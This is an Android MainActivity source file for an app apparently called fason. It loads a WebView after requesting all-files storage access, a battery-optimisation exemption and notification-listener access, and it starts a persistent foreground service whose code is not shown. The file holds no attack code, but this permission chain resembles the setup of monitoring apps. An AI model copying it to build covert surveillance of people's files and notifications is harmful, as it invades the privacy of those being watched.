package com.fason.app.ui;

import android.content.Intent;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.content.ContextCompat;

import com.fason.app.R;
import com.fason.app.core.permissions.PermissionManager;
import com.fason.app.service.MainService;

// Main activity with WebView
public class MainActivity extends AppCompatActivity {

    private static final int PERM_REQ = 1001;
    private HomeManager home;

    @Override
    protected void onCreate(Bundle state) {
        super.onCreate(state);
        setContentView(R.layout.activity_main);

        home = new HomeManager();
        home.init(findViewById(R.id.webView), findViewById(R.id.progressBar));

        if (state != null) {
            home.restoreState(state);
        }

        PermissionManager.requestPerms(this, PERM_REQ);
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (PermissionManager.hasStorageManager()) proceed();
    }

    @Override
    protected void onSaveInstanceState(@NonNull Bundle out) {
        super.onSaveInstanceState(out);
        if (home != null) home.saveState(out);
    }

    @Override
    public void onBackPressed() {
        if (home != null && home.canGoBack()) home.goBack();
        else super.onBackPressed();
    }

    @Override
    protected void onDestroy() {
        if (home != null) home.destroy();
        super.onDestroy();
    }

    // Proceed after permissions
    private void proceed() {
        if (!PermissionManager.hasStorageManager()) {
            PermissionManager.requestStorageManager(this);
            return;
        }

        PermissionManager.requestBatteryExemption(this);
        startSvc();

        if (!PermissionManager.hasNotifAccess(this)) {
            PermissionManager.requestNotifAccess(this);
        } else {
            loadPage();
        }
    }

    // Start service
    private void startSvc() {
        try {
            ContextCompat.startForegroundService(this, new Intent(this, MainService.class));
        } catch (Exception ignored) {}
    }

    // Load web page
    private void loadPage() {
        if (home != null) home.loadPage();
    }

    @Override
    public void onRequestPermissionsResult(int req, @NonNull String[] perms, @NonNull int[] results) {
        super.onRequestPermissionsResult(req, perms, results);
        if (req == PERM_REQ) proceed();
    }
}
